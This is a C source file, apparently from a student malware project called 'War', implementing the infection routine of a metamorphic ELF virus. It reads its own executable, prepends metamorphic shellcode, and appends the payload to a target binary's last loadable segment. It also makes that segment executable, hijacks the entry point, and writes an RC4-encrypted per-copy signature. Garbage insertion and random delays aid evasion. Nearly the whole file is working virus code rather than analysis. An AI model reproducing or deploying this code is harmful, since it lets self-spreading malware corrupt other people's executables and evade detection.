#include "../include/war.h"
#include "../include/metamorph_shellcode.h"

// injector.c - AÑADIR ESTAS FUNCIONES

/*
 * Encontrar el último segmento PT_LOAD ejecutable
 * (donde inyectaremos el payload)
 */
// static Elf64_Phdr *find_code_segment(Elf64_Ehdr *ehdr)
// {
// 	Elf64_Phdr *phdr = (Elf64_Phdr *)((char *)ehdr + ehdr->e_phoff);
// 	Elf64_Phdr *code_segment = NULL;

// 	for (int i = 0; i < ehdr->e_phnum; i++)
// 	{
// 		if (phdr[i].p_type == PT_LOAD && (phdr[i].p_flags & PF_X))
// 		{
// 			code_segment = &phdr[i];
// 		}
// 	}

// 	return code_segment;
// }

/*
 * Calcular la dirección virtual donde estará el payload inyectado
 */
// static uint64_t calculate_payload_vaddr(Elf64_Ehdr *ehdr, size_t payload_offset)
// {
// 	Elf64_Phdr *code_seg = find_code_segment(ehdr);
// 	if (!code_seg)
// 		return 0;

// 	// VAddr = Base del segmento + offset desde el inicio del segmento
// 	return code_seg->p_vaddr + (payload_offset - code_seg->p_offset);
// }

// /*
//  * Generar código de salto al entry point original
//  * Este código va AL FINAL del payload inyectado
//  */
// static size_t generate_jump_to_original(unsigned char *buf, uint64_t from_addr, uint64_t to_addr)
// {
// 	printf("[JUMP] START: from=0x%lx to=0x%lx\n", from_addr, to_addr);
// 	fflush(stdout);

// 	// Verificar que los parámetros son válidos
// 	if (from_addr == 0 || to_addr == 0)
// 	{
// 		printf("[JUMP] ERROR: Invalid addresses!\n");
// 		fflush(stdout);
// 		return 0;
// 	}

// 	// Calcular offset relativo CON cuidado
// 	int64_t offset;
// 	if (to_addr > from_addr)
// 	{
// 		offset = (int64_t)(to_addr - from_addr - 5);
// 	}
// 	else
// 	{
// 		offset = -((int64_t)(from_addr - to_addr + 5));
// 	}

// 	printf("[JUMP] Offset: %ld (0x%lx)\n", offset, (uint64_t)offset);
// 	fflush(stdout);

// 	// Verificar si cabe en un JMP relativo de 32 bits
// 	if (offset >= INT32_MIN && offset <= INT32_MAX)
// 	{
// 		printf("[JUMP] Using relative JMP (5 bytes)\n");
// 		fflush(stdout);

// 		// JMP rel32 (E9 xx xx xx xx)
// 		buf[0] = 0xE9;
// 		*(int32_t *)(buf + 1) = (int32_t)offset;

// 		printf("[JUMP] Generated: E9 %02X %02X %02X %02X\n",
// 			   buf[1], buf[2], buf[3], buf[4]);
// 		fflush(stdout);

// 		return 5;
// 	}
// 	else
// 	{
// 		printf("[JUMP] Using absolute JMP (14 bytes)\n");
// 		fflush(stdout);

// 		// JMP absoluto (FF 25 00 00 00 00 + dirección de 64 bits)
// 		buf[0] = 0xFF;
// 		buf[1] = 0x25;
// 		*(uint32_t *)(buf + 2) = 0;
// 		*(uint64_t *)(buf + 6) = to_addr;

// 		printf("[JUMP] Generated: FF 25 00 00 00 00 + 0x%lx\n", to_addr);
// 		fflush(stdout);

// 		return 14;
// 	}
// }

static bool find_signature_location(virus_payload *payload)
{

	unsigned char signature_pattern[] = {0x99, 0xa4, 0x9c, 0x24, 0xb2};
	size_t pattern_len = sizeof(signature_pattern);

	size_t start_offset = METAMORPH_SHELLCODE_SIZE;

	for (size_t i = start_offset; i < payload->size - pattern_len; i++)
	{
		if (memcmp(payload->code + i, signature_pattern, pattern_len) == 0)
		{
			payload->sig_offset = i;
			return true;
		}
	}

	unsigned char rc4_key[9];
	unsigned char OBFUSCATED_KEY[] = {
		0x76, 0x70, 0x66, 0x66, 0x35, 0x23, 0x30, 0x66, 0x66};
	for (size_t i = 0; i < 9; i++)
	{
		rc4_key[i] = OBFUSCATED_KEY[i] ^ 0x42;
	}

	unsigned char test_buffer[64];
	const char target[] = "War version";

	for (size_t i = start_offset; i < payload->size - 64; i++)
	{
		memcpy(test_buffer, payload->code + i, 64);
		rc4_crypt(test_buffer, 64, rc4_key, 9);

		if (memcmp(test_buffer, target, strlen(target)) == 0)
		{
			payload->sig_offset = i;
			return true;
		}
	}

	return false;
}

static uint32_t generate_new_fingerprint(void)
{
	uint32_t seed = 0;

	seed ^= (uint32_t)time(NULL);
	seed ^= (uint32_t)getpid();
	seed ^= (uint32_t)(uintptr_t)&seed;

	int fd = open("/dev/urandom", O_RDONLY);
	if (fd >= 0)
	{
		uint32_t random_val;
		read(fd, &random_val, sizeof(random_val));
		seed ^= random_val;
		close(fd);
	}

	seed = (seed << 13) | (seed >> 19);
	seed ^= 0xDEADBEEF;

	return seed;
}

static void patch_signature(virus_payload *payload)
{
	if (payload->sig_offset == 0)
	{
		return;
	}

	uint32_t new_fingerprint = generate_new_fingerprint();

	unsigned char rc4_key[9];
	unsigned char OBFUSCATED_KEY[] = {
		0x76, 0x70, 0x66, 0x66, 0x35, 0x23, 0x30, 0x66, 0x66};
	for (size_t i = 0; i < 9; i++)
	{
		rc4_key[i] = OBFUSCATED_KEY[i] ^ 0x42;
	}

	char new_signature[64];
	snprintf(new_signature, sizeof(new_signature),
			 "War version 1.0 (c)oded by jainavas - jvidal-t - [%08X]",
			 new_fingerprint);

	unsigned char encrypted_sig[64];
	memcpy(encrypted_sig, new_signature, strlen(new_signature));
	rc4_crypt(encrypted_sig, strlen(new_signature), rc4_key, 9);

	memcpy(payload->code + payload->sig_offset,
		   encrypted_sig,
		   strlen(new_signature));
}

static virus_payload *read_self_code(void)
{
	virus_payload *payload = malloc(sizeof(virus_payload));
	if (!payload)
		return NULL;

	int fd = custom_open("/proc/self/exe", O_RDONLY);
	if (fd < 0)
	{
		free(payload);
		return NULL;
	}

	struct stat st;
	if (fstat(fd, &st) < 0)
	{
		custom_close(fd);
		free(payload);
		return NULL;
	}

	void *self_data = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	custom_close(fd);

	if (self_data == MAP_FAILED)
	{
		free(payload);
		return NULL;
	}

	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)self_data;
	Elf64_Phdr *phdr = (Elf64_Phdr *)(self_data + ehdr->e_phoff);

	size_t min_offset = (size_t)-1;
	size_t max_end = 0;

	for (int i = 0; i < ehdr->e_phnum; i++)
	{
		if (phdr[i].p_type == PT_LOAD)
		{
			if (phdr[i].p_offset < min_offset)
			{
				min_offset = phdr[i].p_offset;
			}
			size_t segment_end = phdr[i].p_offset + phdr[i].p_filesz;
			if (segment_end > max_end)
			{
				max_end = segment_end;
			}
		}
	}

	if (min_offset == (size_t)-1 || max_end == 0)
	{
		munmap(self_data, st.st_size);
		free(payload);
		return NULL;
	}

	size_t total_size = max_end - min_offset;
	void *code_start = self_data + min_offset;

	// ⭐ CAMBIO PRINCIPAL: Añadir espacio para metamorph al inicio
	size_t new_size = METAMORPH_SHELLCODE_SIZE + total_size;
	payload->code = malloc(new_size);
	if (!payload->code)
	{
		munmap(self_data, st.st_size);
		free(payload);
		return NULL;
	}

	// ⭐ Copiar metamorph shellcode al inicio
	memcpy(payload->code, metamorph_shellcode, METAMORPH_SHELLCODE_SIZE);

	// ⭐ Copiar el código existente de War después del shellcode
	memcpy(payload->code + METAMORPH_SHELLCODE_SIZE, code_start, total_size);

	payload->size = new_size;
	printf("pepino %ld\n", new_size);
	payload->sig_offset = 0; // Se buscará en find_signature_location()

	munmap(self_data, st.st_size);

	return payload;
}

static int write_infected_file(const char *filepath, void *data, size_t size)
{
	int fd;
	ssize_t written;
	struct stat st;
	mode_t original_mode = 0644;
	if (stat(filepath, &st) == 0)
	{
		original_mode = st.st_mode;
	}
	fd = custom_open(filepath, O_WRONLY | O_TRUNC);
	if (fd < 0)
		return -1;
	written = custom_write(fd, data, size);
	printf("shampoo\n");
	fchmod(fd, original_mode);
	custom_close(fd);
	if (written < 0 || (size_t)written != size)
		return -1;
	return 0;
}

int infect_binary(const char *filepath)
{
	t_elf elf = {0};
	virus_payload *virus = NULL;
	const char *sig;
	size_t sig_len;
	void *new_data = NULL;
	size_t new_size;
	size_t original_size;
	long long save;
	Elf64_Ehdr *new_ehdr;
	save = pepino;
	Elf64_Phdr *new_phdr;
	Elf64_Shdr *new_shdr;
	int ret = -1;
	insert_garbage();
	int order = get_execution_order();
	pepino *= 11;
	if (order == 0 || order == 1)
	{
		if (parse_elf(filepath, &elf) < 0)
			return printf("1\n"), -1;
		insert_garbage3();
	}
	pepino += 23432;
	if (order == 2 || order == 3)
	{
		if (parse_elf(filepath, &elf) < 0)
			return printf("2\n"), -1;
		insert_garbage4();
	}
	insert_garbage4();
	if (is_infected(&elf))
	{
		cleanup_elf(&elf);
		return printf("3\n"), 0;
	}
	random_delay();
	virus = read_self_code();
	if (!virus)
	{
		cleanup_elf(&elf);
		return printf("4\n"), -1;
	}
	if (!find_signature_location(virus))
	{
		free(virus->code);
		free(virus);
		cleanup_elf(&elf);
		return printf("5\n"), -1;
	}
	patch_signature(virus);
	unsigned char rc4_key[9];
	unsigned char OBFUSCATED_KEY[] = {
		0x76, 0x70, 0x66, 0x66, 0x35, 0x23, 0x30, 0x66, 0x66};
	for (size_t i = 0; i < 9; i++)
	{
		rc4_key[i] = OBFUSCATED_KEY[i] ^ 0x42;
	}
	static char final_signature[128];
	memset(final_signature, 0, sizeof(final_signature));
	size_t sig_to_copy = 59;
	if (virus->sig_offset + sig_to_copy > virus->size)
	{
		sig_to_copy = virus->size - virus->sig_offset;
	}
	memcpy(final_signature, virus->code + virus->sig_offset, sig_to_copy);
	rc4_crypt((unsigned char *)final_signature, sig_to_copy, rc4_key, 9);
	final_signature[sig_to_copy] = '\0';
	sig = final_signature;
	sig_len = strlen(sig) + 1;
	printf("start\n");
	original_size = elf.size;
uint64_t original_entry = elf.ehdr->e_entry;

printf("[DEBUG] Original size: %zu, entry: 0x%lx\n", original_size, original_entry);

// Buscar el último segmento PT_LOAD
Elf64_Phdr *phdr = (Elf64_Phdr *)((char *)elf.data + elf.ehdr->e_phoff);
uint64_t payload_vaddr = 0;
Elf64_Phdr *last_load_seg = NULL;
size_t last_load_idx = 0;

// Listar todos los segmentos para debug
printf("[DEBUG] All segments:\n");
for (int i = 0; i < elf.ehdr->e_phnum; i++) {
    printf("  [%d] type=%u offset=0x%lx filesz=%lu vaddr=0x%lx flags=0x%x\n",
           i, phdr[i].p_type, phdr[i].p_offset, phdr[i].p_filesz, 
           phdr[i].p_vaddr, phdr[i].p_flags);
}

// Buscar el último segmento PT_LOAD
size_t max_end = 0;
for (int i = 0; i < elf.ehdr->e_phnum; i++) {
    if (phdr[i].p_type == PT_LOAD) {
        size_t seg_end = phdr[i].p_offset + phdr[i].p_filesz;
        
        if (seg_end > max_end) {
            max_end = seg_end;
            last_load_seg = &phdr[i];
            last_load_idx = i;
        }
    }
}

if (!last_load_seg) {
    printf("[ERROR] No PT_LOAD segment found\n");
    free(virus->code);
    free(virus);
    cleanup_elf(&elf);
    return -1;
}

// Calcular VAddr del payload
payload_vaddr = last_load_seg->p_vaddr + last_load_seg->p_memsz;

printf("[DEBUG] Using segment %zu for injection\n", last_load_idx);
printf("[DEBUG] Segment ends at file offset: %zu\n", max_end);
printf("[DEBUG] Payload vaddr: 0x%lx\n", payload_vaddr);
printf("[DEBUG] original_entry: 0x%lx\n", original_entry);
printf("[DEBUG] virus->size: %ld\n", virus->size);
fflush(stdout);
// Generar salto al entry original
unsigned char jmp_to_original[14];
size_t jmp_size;

uint64_t jmp_from = payload_vaddr + virus->size;
printf("[DEBUG] jmp_from calculated: 0x%lx\n", jmp_from);
fflush(stdout);
uint64_t jmp_to = original_entry;


int64_t rel_offset = (int64_t)(jmp_to - (jmp_from + 5));
printf("[DEBUG] rel_offset: %ld (0x%lx)\n", rel_offset, (uint64_t)rel_offset);
fflush(stdout);
if (rel_offset >= INT32_MIN && rel_offset <= INT32_MAX) {
    jmp_to_original[0] = 0xE9;
    *(int32_t *)(&jmp_to_original[1]) = (int32_t)rel_offset;
    jmp_size = 5;
} else {
    jmp_to_original[0] = 0xFF;
    jmp_to_original[1] = 0x25;
    *(uint32_t *)(&jmp_to_original[2]) = 0;
    *(uint64_t *)(&jmp_to_original[6]) = jmp_to;
    jmp_size = 14;
}

printf("[DEBUG] Jump from 0x%lx to 0x%lx (offset: %ld)\n", jmp_from, jmp_to, rel_offset);

// Calcular tamaño total
size_t total_injection_size = virus->size + jmp_size + sig_len;
new_size = original_size + total_injection_size;

printf("[DEBUG] Total injection size: %zu\n", total_injection_size);
printf("[DEBUG] New file size: %zu\n", new_size);

new_data = malloc(new_size);
if (!new_data)
{
    free(virus->code);
    free(virus);
    cleanup_elf(&elf);
    return -1;
}

insert_garbage5();

// Copiar ELF original
memcpy(new_data, elf.data, original_size);
cleanup_elf(&elf);

// Copiar payload (metamorph + War code)
memcpy((char *)new_data + original_size, virus->code, virus->size);

// Copiar salto
memcpy((char *)new_data + original_size + virus->size, jmp_to_original, jmp_size);

// Copiar signature
memcpy((char *)new_data + original_size + virus->size + jmp_size, sig, sig_len);

// Liberar virus
free(virus->code);
free(virus);
virus = NULL;

// Modificar headers
new_ehdr = (Elf64_Ehdr *)new_data;
new_phdr = (Elf64_Phdr *)((char *)new_data + new_ehdr->e_phoff);
new_shdr = (Elf64_Shdr *)((char *)new_data + new_ehdr->e_shoff);

// ⭐ Modificar entry point
printf("[DEBUG] Changing entry from 0x%lx to 0x%lx\n", new_ehdr->e_entry, payload_vaddr);
new_ehdr->e_entry = payload_vaddr;

// ⭐ Extender el segmento correcto
printf("[DEBUG] Extending segment %zu\n", last_load_idx);
printf("[DEBUG] Old filesz: %lu, new: %lu\n", 
       new_phdr[last_load_idx].p_filesz, 
       new_phdr[last_load_idx].p_filesz + total_injection_size);

new_phdr[last_load_idx].p_filesz += total_injection_size;
new_phdr[last_load_idx].p_memsz += total_injection_size;

// Hacer el segmento ejecutable si no lo es
if (!(new_phdr[last_load_idx].p_flags & PF_X)) {
    printf("[DEBUG] Making segment executable\n");
    new_phdr[last_load_idx].p_flags |= PF_X;
}

	// Extender última sección
	int last_section = -1;
	size_t max_offset = 0;
	for (int i = 0; i < new_ehdr->e_shnum; i++)
	{
		size_t section_end = new_shdr[i].sh_offset + new_shdr[i].sh_size;
		if (section_end > max_offset && section_end <= original_size)
		{
			max_offset = section_end;
			last_section = i;
		}
	}
	printf("lechuga\n");
	insert_garbage5();
	if (last_section >= 0)
		new_shdr[last_section].sh_size += total_injection_size;

	ret = write_infected_file(filepath, new_data, new_size);
	printf("ciruelas\n");
	free(new_data);
	if (virus)
	{
		free(virus->code);
		free(virus);
		virus = NULL;
	}
	pepino = save;
	pepino *= 1;
	return ret;
}